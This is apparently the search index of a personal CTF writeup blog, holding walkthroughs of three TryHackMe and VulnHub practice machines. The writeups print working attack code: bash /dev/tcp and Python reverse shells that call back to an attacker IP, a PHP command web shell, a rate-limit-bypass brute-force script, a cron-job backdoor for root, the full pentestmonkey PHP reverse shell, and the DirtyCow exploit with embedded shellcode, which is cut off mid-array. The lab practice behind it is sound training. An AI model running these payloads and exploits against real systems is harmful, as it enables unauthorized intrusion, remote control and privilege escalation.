
var documents = [{
    "id": 0,
    "url": "/404.html",
    "title": "404",
    "body": "404 Page not found!Please use the search bar from the bottom left or visit our homepage! "
    }, {
    "id": 1,
    "url": "/about",
    "title": "Hello world, I'm Razor",
    "body": " I am someone who likes hacking, I often do pentesting on several platforms such as Hackthebox, Tryhackme and other CTF. on this website I provide a writeup that I made myself according to my understanding. I hope you enjoy this writeup and happy hacking :D  Hackthebox Profile : https://www. hackthebox. eu/profile/344730   Tryhackme Profile : https://tryhackme. com/p/razorxd   My Social Media"
    }, {
    "id": 2,
    "url": "/authors",
    "title": "Authors",
    "body": "{% for author in site. authors %}                       {% if author[1]. gravatar %}                {% else %}                {% endif %}                  {% if author[1]. web %}                       {% endif %}          {% if author[1]. twitter %}                      {% endif %}          {% if author[1]. email %}                      {% endif %}                                     {{ author[1]. display_name }}:         {{ author[1]. description }}                {% endfor %}"
    }, {
    "id": 3,
    "url": "/categories",
    "title": "Categories",
    "body": ""
    }, {
    "id": 4,
    "url": "/contact",
    "title": "Contact",
    "body": "  Please send your message to {{site. name}}. We will reply as soon as possible!   "
    }, {
    "id": 5,
    "url": "/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 6,
    "url": "/page2/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 7,
    "url": "/page3/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 8,
    "url": "/page4/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 9,
    "url": "/robots.txt",
    "title": "",
    "body": "      Sitemap: {{ “sitemap. xml”   absolute_url }}   "
    }, {
    "id": 10,
    "url": "/writeup-hackerofthehill/",
    "title": "Tryhackme hackerofthehill",
    "body": "2021/03/11 - Introduction: This is partical room from tryhackme entitled hackerofthehill with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty invitation. Link room in here Easy: Scanning: Let’s just scanning full port of the box : nmap 10. 10. 133. 88 -sC -sV -p-. Result : nmap 10. 10. 179. 236 -p- --min-rate 10000                                 Starting Nmap 7. 91 ( https://nmap. org ) at 2021-03-11 19:59 WIBWarning: 10. 10. 179. 236 giving up on port because retransmission cap hit (10). Nmap scan report for 10. 10. 179. 236Host is up (0. 34s latency). Not shown: 65511 closed portsPORT   STATE  SERVICE22/tcp  open   ssh80/tcp  open   http2120/tcp filtered kauth5301/tcp filtered hacl-gs8000/tcp open   http-alt8001/tcp open   vcom-tunnel8002/tcp open   teradataordbms9999/tcp open   abyssNmap done: 1 IP address (1 host up) scanned in 29. 46 secondsFull port Enumeration : nmap 10. 10. 179. 236 -p80,8000,8001,8002,9999 -sC -sVResult : nmap 10. 10. 179. 236 -p80,8000,8001,8002,9999 -sC -sVStarting Nmap 7. 91 ( https://nmap. org ) at 2021-03-11 20:01 WIBNmap scan report for 10. 10. 179. 236Host is up (0. 34s latency). PORT   STATE SERVICE VERSION80/tcp  open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works8000/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))| http-robots. txt: 1 disallowed entry |_/vbcms|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: VeryBasicCMS - Home8001/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)| http-title: My Website|_Requested resource was /?page=home. php8002/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: Learn PHP9999/tcp open abyss?| fingerprint-strings: |  FourOhFourRequest: |   HTTP/1. 0 200 OK|   Date: Thu, 11 Mar 2021 13:01:56 GMT|   Content-Length: 0|  GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |   HTTP/1. 1 400 Bad Request|   Content-Type: text/plain; charset=utf-8|   Connection: close|   Request|  GetRequest: |   HTTP/1. 0 200 OK|   Date: Thu, 11 Mar 2021 13:01:54 GMT|   Content-Length: 0|  HTTPOptions: |   HTTP/1. 0 200 OK|   Date: Thu, 11 Mar 2021 13:01:55 GMT|_  Content-Length: 01 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port9999-TCP:V=7. 91%I=7%D=3/11%Time=604A14C2%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,4B, HTTP/1\. 0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x2020SF:21\x2013:01:54\x20GMT\r\nContent-Length:\x200\r\n\r\n )%r(HTTPOptions,4SF:B, HTTP/1\. 0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x202021\x2013:0SF:1:55\x20GMT\r\nContent-Length:\x200\r\n\r\n )%r(FourOhFourRequest,4B, HSF:TTP/1\. 0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x202021\x2013:01:56SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n )%r(GenericLines,67, HTTP/1\. 1\SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utfSF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request )%r(RTSPRequestSF:,67, HTTP/1\. 1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request SF:)%r(Help,67, HTTP/1\. 1\x20400\x20Bad\x20Request\r\nContent-Type:\x20texSF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20SF:Request )%r(SSLSessionReq,67, HTTP/1\. 1\x20400\x20Bad\x20Request\r\nConSF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\SF:r\n400\x20Bad\x20Request )%r(TerminalServerCookie,67, HTTP/1\. 1\x20400\SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCSF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request )%r(TLSSessionReq,67, SF:HTTP/1\. 1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cSF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request )%r(KSF:erberos,67, HTTP/1\. 1\x20400\x20Bad\x20Request\r\nContent-Type:\x20textSF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20RSF:equest )%r(LPDString,67, HTTP/1\. 1\x20400\x20Bad\x20Request\r\nContent-SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40SF:0\x20Bad\x20Request )%r(LDAPSearchReq,67, HTTP/1\. 1\x20400\x20Bad\x20ReSF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\xSF:20close\r\n\r\n400\x20Bad\x20Request )%r(SIPOptions,67, HTTP/1\. 1\x2040SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request );Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 112. 57 secondsPort 8000: I have done checking a port 80 and its just default apache page and nothing there. So i move on to port 8000 and there is the page : Then i’m trying to using gobuster for brute the directory and file . gobuster dir -u http://10. 10. 179. 236:8000/ -w /usr/share/wordlists/dirb/common. txt -x php,txt,html===============================================================Gobuster v3. 0. 1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:      http://10. 10. 166. 45:8000[+] Threads:    10[+] Wordlist:    /usr/share/wordlists/dirb/common. txt[+] Status codes:  200,204,301,302,307,401,403[+] User Agent:   gobuster/3. 0. 1[+] Extensions:   txt,html,php[+] Timeout:    10s===============================================================2021/03/11 20:10:18 Starting gobuster in directory enumeration mode===============================================================/about (Status: 200)/contact (Status: 200)/robots. txt (Status: 200)/server-status (Status: 403)===============================================================2021/03/11 20:25:47 Finished===============================================================As you can see we found robots. txt, let’s take a look at that.  The file robots. txt tell us that there is some directory of cms, Now let’s see the page /vbcms.  In this login form i’m trying to performs some default user credentials and i found user of admin admin:admin .  Then there is some basic of cms we can edit to getting any shell, to simply we can use php command shell like this. &lt;?php  exec( /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10. 2. 47. 251/9001 0&gt;&amp;1'  ); ?&gt; Now we have the shell, After that we can get the flag. serv1@web-serv:/var/www/serv1/public$ cat /usr/games/fortune                   cat /usr/games/fortune                                VEhNe05HSTROems0T0dJM01ERTRORFV6TldZd05qTXlaalkxfQo=                 serv1@web-serv:/var/www/serv1/public$ cat /usr/games/fortune|base64 -d        cat /usr/games/fortune|base64 -d                           THM{NG----------------------------Y1}                        serv1@web-serv:/var/www/serv1/public$ Port 8001: Let’s go to port 8001 : Then we go to tab Support : At this section i am using burpsuite to capture the response.  As you can see we can know where the location of the file upload and i’m tried to put the link upload to the parameter ?page= and there is the page.  The page shows us the text of the image we uploaded. So i tried to put basic command php and see what it works .  Then Let’s take a look at source code As you can see that its work. Now let’s put shell on php code like we doing before.  Now we get the shell of serv2 :D, Let’s go to flag in /var/lib/rary.  Port 8002: After port 8001 we gonna to take a look at port 8002 and here the page : Then we can create accound Sign me Up and after sign up there can’t working, now just take a look at try free lesson and check id echo `id`;.  then we can get any shell from this: exec( /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10. 2. 47. 251/9001 0&gt;&amp;1'  ); then nc -lvnp 9001.  So we can get flag in /var/www/serv4/index. php serv3@web-serv:/var/www/serv3/public$ cat /var/www/serv4/index. php                        THM{Ym---------------------------zZh}Privilage Escalation: First i do checking crontab and there is have some process backup and its running on root. /etc/crontab: serv3@web-serv:/var/www/serv3/public$ cat /etc/crontab # /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron. d. These files also have username fields,# that none of the other crontabs do. SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user command17 *  * * *  root  cd / &amp;&amp; run-parts --report /etc/cron. hourly25 6  * * *  root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. daily )47 6  * * 7  root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. weekly )52 6  1 * *  root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron. monthly )#* * * * * root /home/serv3/backups/backup. shSince file permission is can be execute, then we can change backup. sh to all user chmod 777 /home/serv3/backups/backup. sh and add code execution like this echo 'bash -i &gt;&amp; /dev/tcp/10. 2. 47. 251/9003 0&gt;&amp;1' &gt;&gt; /home/serv3/backups/backu. sh, the last of it is prepare the netcat nc -lvnp 9003. Wait until we can hit in nc. Then wait it Now we have the root user, so you can grab any flag or all flag if you want :D. the flag of root will be in /root/root. txt Medium: Scanning: Let’s just scanning full port of the box : ` nmap 10. 10. 59. 182 -p- –min-rate 10000 ` Starting Nmap 7. 91 ( https://nmap. org ) at 2021-03-18 17:22 WIBNmap scan report for 10. 10. 59. 182Host is up (0. 39s latency). Not shown: 65529 filtered portsPORT   STATE SERVICE80/tcp  open http135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds3269/tcp open globalcatLDAPssl3389/tcp open ms-wbt-serverNmap done: 1 IP address (1 host up) scanned in 66. 55 secondsNow let’s enumeration all port : nmap 10. 10. 59. 182 -p80,135,139,445,3269 -sC -sV Starting Nmap 7. 91 ( https://nmap. org ) at 2021-03-18 17:25 WIBNmap scan report for 10. 10. 59. 182Host is up (0. 37s latency). PORT   STATE SERVICE    VERSION80/tcp  open http     Microsoft IIS httpd 10. 0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0|_http-title: PhotoStore - Home135/tcp open msrpc     Microsoft Windows RPC139/tcp open netbios-ssn  Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3269/tcp open tcpwrappedService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: -2s| smb2-security-mode: |  2. 02: |_  Message signing enabled and required| smb2-time: |  date: 2021-03-18T10:25:46|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 72. 26 secondsLet’s take a look at port 80 : Now let’s signup and login this website then will be able go to dashboard.  then i’m gonna to test upload file . jpg and this happens.  if we clicked then web show us the image.  and after looking around i found script. js which is we can disable it and try any command injection in username. $('input[name= username ]'). keyup(function(){  let username = $(this). val();  $(this). val( username. replace(/([^a-zA-Z0-9])/g,'') );});i’m trying go to profile , then disable the script. js. I’m trying disable it in mozila firefox which just going to inspect then go to network and disable it.  Now trying to get "
    }, {
    "id": 11,
    "url": "/writeup-tryhackme-sustah/",
    "title": "Tryhackme sustah",
    "body": "2021/03/05 - Introduction: This is partical room from tryhackme entitled “sustah” from Tryhackme . Difficulty of This box is Medium and in this box you will learn all about exploiting CMS , Missconfiguration, Bruteforcing, Privilage escalation. Okay no let’s Pwn this box :p. Room Link here Scanning: Nmap: First we must scanning the ip using nmap : nmap 10. 10. 195. 141 -sC -sV Nmap scan report for 10. 10. 195. 141Host is up (0. 34s latency). Not shown: 997 closed portsPORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 10 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)|  256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)|_ 256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)80/tcp  open http  Apache httpd 2. 4. 18 ((Ubuntu))|_http-server-header: Apache/2. 4. 18 (Ubuntu)|_http-title: Susta8085/tcp open http  Gunicorn 20. 0. 4|_http-server-header: gunicorn/20. 0. 4|_http-title: SpinnerService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Thu Mar 4 17:20:51 2021 -- 1 IP address (1 host up) scanned in 24. 76 secondsAs you can see the box have 3 port open like ssh, http and another cms. Now lets take a look at port 80: Nothing interesting here let’s jump to port 8085.  There is have some word Feeling lucky? Guess the right number. You have a 0. 004% chance of winning. which mean we can bruteforece number for the lucky.  I have trying to bruteforce the number but there is have rate limits and i’m going to research then found this. We can bypass it using header X-Remote-Addr: 127. 0. 0. 1 and it worked. My code : #!/usr/bin/python3import requestsimport sysimport reurl =  http://10. 10. 195. 141:8085/ reqse = requests. session()for number in range(10000,99999):    head = { X-Remote-Addr  :  127. 0. 0. 1 }    data = { number  : number}    output = reqse. post(url, headers = head, data = data)    if  rate limit exceeded  in output. text:        print( Limit Exceeded :D )    elif  Oh no! How unlucky. Spin the wheel and try again.   in output. text:        print( try Number :  ,number)        pass    else:        print(f [+]The number is  ,number)        breakand here the result : Now we found the number, let’s put this.  Then we found path for getting cms site. now let’s go to http://10. 10. 249. 153/Yo---------th/ After looking around i’m found this which mean we can login as admin with default credentials.  Now lets going to file and create net file some revershell &lt;?php echo passthru($_GET['cmd']) ?&gt; and upload it.  The file will be saved in /img/shellrazor. php.  Now lets check the command like this : /shellrazor. php?cmd=idhere the result Getting shell: Web shell: Its works now let create some payload to getting revershell, here my payload to getting shell export RHOST= 10. 2. 47. 251 ;export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket. socket();s. connect((os. getenv( RHOST ),int(os. getenv( RPORT ))));[os. dup2(s. fileno(),fd) for fd in (0,1,2)];pty. spawn( /bin/bash )' Now we have shell. After looking some hint in thm there is have some backup file. After looking arround i found backup file in /var/backups and contain password of user . bak. passwd Getting user: Now we just login with user kiran password : As you can see it’s work , Then we must getting root. Privilage Escalation: In this case im using linpeas to get privilage escalation and i found this: Now let’s going to gtfobins here about rsync and here my command : doas rsync -e 'sh -c  sh 0&lt;&amp;2 1&gt;&amp;2 ' 127. 0. 0. 1:/dev/null And Boom!! we get the root XD So thats it my writeup and there is so simple writeup you can follow if you want and see you next time :D Happyhacking :D "
    }, {
    "id": 12,
    "url": "/writeup-vulnhub-loly/",
    "title": "Loly Writeup",
    "body": "2021/03/02 - Introduction: This is partical room from tryhackme entitled “Loly” form vulnhub. Difficulty of This box is easy and in this box you will learn all about exploiting Wordpress , Bruteforce login, Custom exploitation For privilage escalation. Okay no let’s Pwn this box :p. Scanning: First think we gonna do now is scanning the machines using nmap : $ nmap 192. 168. 144. 121 -sC -sV                      255 ⨯Starting Nmap 7. 91 ( https://nmap. org ) at 2021-03-02 19:51 WIBNmap scan report for 192. 168. 144. 121Host is up (0. 26s latency). Not shown: 998 closed portsPORT  STATE  SERVICE   VERSION80/tcp open   http     nginx 1. 10. 3 (Ubuntu)|_http-server-header: nginx/1. 10. 3 (Ubuntu)|_http-title: Welcome to nginx!783/tcp filtered spamassassinService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27. 40 secondsAs you can see the port open just http nginx which is it’s just default pages of nginx. In this case i’m trying to bruteforce or fuzzing directory and i found /wordpress : After looking around i found page and it’s an error when opened. Then im try to put domain loly. lcto hosts : $ cat /etc/hosts        127. 0. 0. 1    localhost127. 0. 1. 1    Razor# CTF192. 168. 144. 121 loly. lc# The following lines are desirable for IPv6 capable hosts::1   localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersNow let’s reopen browser and going to this url http://loly. lc/wordpress.  Enumeration: Wpscan: We are now the website using wordpress. In this case i want to using tools namely WPScan to enumeration website. wpscan --url http://loly. lc/wordpress --enumerate u . _______________________________________________________________     __     _______  _____     \ \    / / __ \ / ____|     \ \ /\ / /| |__) | (___  ___ __ _ _ __ ®      \ \/ \/ / | ___/ \___ \ / __|/ _` | '_ \      \ /\ / | |   ____) | (__| (_| | | | |       \/ \/  |_|  |_____/ \___|\__,_|_| |_|     WordPress Security Scanner by the WPScan Team             Version 3. 8. 15    Sponsored by Automattic - https://automattic. com/    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]N[+] URL: http://loly. lc/wordpress/ [192. 168. 144. 121][+] Started: Tue Mar 2 20:13:22 2021Interesting Finding(s):                                         [+] Headers                                    | Interesting Entry: Server: nginx/1. 10. 3 (Ubuntu)                | Found By: Headers (Passive Detection)                     | Confidence: 100%[+] XML-RPC seems to be enabled: http://loly. lc/wordpress/xmlrpc. php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex. wordpress. org/XML-RPC_Pingback_API | - https://www. rapid7. com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www. rapid7. com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www. rapid7. com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www. rapid7. com/db/modules/auxiliary/scanner/http/wordpress_pingback_access[+] WordPress readme found: http://loly. lc/wordpress/readme. html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://loly. lc/wordpress/wp-cron. php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www. iplocation. net/defend-wordpress-from-ddos | - https://github. com/wpscanteam/wpscan/issues/1299[+] WordPress version 5. 5 identified (Insecure, released on 2020-08-11). | Found By: Rss Generator (Passive Detection) | - http://loly. lc/wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress. org/?v=5. 5&lt;/generator&gt; | Confirmed By: Emoji Settings (Passive Detection) | - http://loly. lc/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release. min. js?ver=5. 5'[+] WordPress theme in use: feminine-style | Location: http://loly. lc/wordpress/wp-content/themes/feminine-style/ | Last Updated: 2019-10-17T00:00:00. 000Z | Readme: http://loly. lc/wordpress/wp-content/themes/feminine-style/readme. txt | [!] The version is out of date, the latest version is 2. 0. 0 | Style URL: http://loly. lc/wordpress/wp-content/themes/feminine-style/style. css?ver=5. 5 | Style Name: Feminine Style | Style URI: https://www. acmethemes. com/themes/feminine-style | Description: Feminine Style is a voguish, dazzling and very appealing WordPress theme. The theme is completely wo. . . | Author: acmethemes | Author URI: https://www. acmethemes. com/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1. 0. 0 (80% confidence) | Found By: Style (Passive Detection) | - http://loly. lc/wordpress/wp-content/themes/feminine-style/style. css?ver=5. 5, Match: 'Version: 1. 0. 0'[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 &lt;======================&gt; (10 / 10) 100. 00% Time: 00:00:01[i] User(s) Identified:[+] loly | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] A WordPress Commenter | Found By: Rss Generator (Passive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan. com/register[+] Finished: Tue Mar 2 20:13:38 2021[+] Requests Done: 54[+] Cached Requests: 7[+] Data Sent: 14. 804 KB[+] Data Received: 421. 805 KB[+] Memory used: 155. 531 MB[+] Elapsed time: 00:00:15We can see we found user namely loly. So we can bruteforce the user to login wordpress. In this case i’m still using wpscan to bruteforce password . You also using hydra to bruteforce. wpscan : $ wpscan --url http://loly. lc/wordpress -U loly -P /home/razor/Documents/Wordlist/SecLists/Passwords/darkweb2017-top1000. txt Now we got the password from lofi, let’s login wordpress and search plugin for exploit. After looking around i found plugin which contain upload file.  Then i found where we execute the file.  Exploit: Now let’s create php revershell and compress to zip zip shell. zip shell. php. &lt;?phpset_time_limit (0);$VERSION =  1. 0 ;$ip = '192. 168. 49. 144'; // CHANGE THIS$port = 1234;    // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try. . . if (function_exists('pcntl_fork')) {	// Fork and have the parent process exit	$pid = pcntl_fork();		if ($pid == -1) {		printit( ERROR: Can't fork );		exit(1);	}		if ($pid) {		exit(0); // Parent exits	}	// Make the current process a session leader	// Will only succeed if we forked	if (posix_setsid() == -1) {		printit( Error: Can't setsid() );		exit(1);	}	$daemon = 1;} else {	printit( WARNING: Failed to daemonise.  This is quite common and not fatal.  );}// Change to a safe directorychdir( / );// Remove any umask we inheritedumask(0);//// Do the reverse shell. . . //// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {	printit( $errstr ($errno) );	exit(1);}// Spawn shell process$descriptorspec = array(  0 =&gt; array( pipe ,  r ), // stdin is a pipe that the child will read from  1 =&gt; array( pipe ,  w ), // stdout is a pipe that the child will write to  2 =&gt; array( pipe ,  w )  // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {	printit( ERROR: Can't spawn shell );	exit(1);}// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit( Successfully opened reverse shell to $ip:$port );while (1) {	// Check for end of TCP connection	if (feof($sock)) {		printit( ERROR: Shell connection terminated );		break;	}	// Check for end of STDOUT	if (feof($pipes[1])) {		printit( ERROR: Shell process terminated );		break;	}	// Wait until a command is end down $sock, or some	// command output is available on STDOUT or STDERR	$read_a = array($sock, $pipes[1], $pipes[2]);	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);	// If we can read from the TCP socket, send	// data to process's STDIN	if (in_array($sock, $read_a)) {		if ($debug) printit( SOCK READ );		$input = fread($sock, $chunk_size);		if ($debug) printit( SOCK: $input );		fwrite($pipes[0], $input);	}	// If we can read from the process's STDOUT	// send data down tcp connection	if (in_array($pipes[1], $read_a)) {		if ($debug) printit( STDOUT READ );		$input = fread($pipes[1], $chunk_size);		if ($debug) printit( STDOUT: $input );		fwrite($sock, $input);	}	// If we can read from the process's STDERR	// send data down tcp connection	if (in_array($pipes[2], $read_a)) {		if ($debug) printit( STDERR READ );		$input = fread($pipes[2], $chunk_size);		if ($debug) printit( STDERR: $input );		fwrite($sock, $input);	}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we've daemonised ourself// (I can't figure out how to redirect STDOUT like a proper daemon)function printit ($string) {	if (!$daemon) {		print  $string\n ;	}}?&gt; Getting Shell: Then upload it , then before execute it we must create netcate for listener nc -lvnp 1234 .  So we are connected to shell now. In this one i’m using tools namely linux-exploit-suggester. sh And there is the result.  Privilage Escalation: As you can see there is a lot suggest of vuln privilage. In this case i want to using dirtcow to getting privilage of root. here The code to exploit and getting root. cowroot. c : /** (un)comment correct payload first (x86 or x64)!* * $ gcc cowroot. c -o cowroot -pthread* $ . /cowroot* DirtyCow root privilege escalation* Backing up /usr/bin/passwd. . to /tmp/bak* Size of binary: 57048* Racing, this may take a while. . * /usr/bin/passwd overwritten* Popping root shell. * Don't forget to restore /tmp/bak* thread stopped* thread stopped* root@box:/root/cow# id* uid=0(root) gid=1000(foo) groups=1000(foo)** @robinverton */#include &lt;stdio. h&gt;#include &lt;stdlib. h&gt;#include &lt;sys/mman. h&gt;#include &lt;fcntl. h&gt;#include &lt;pthread. h&gt;#include &lt;string. h&gt;#include &lt;unistd. h&gt;void *map;int f;int stop = 0;struct stat st;char *name;pthread_t pth1,pth2,pth3;// change if no permissions to readchar suid_binary[] =  /usr/bin/passwd ;/** $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i*/ unsigned char sc[] = { 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05};unsigned int sc_len = 177;/** $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -iunsigned char sc[] = { 0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00, 0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 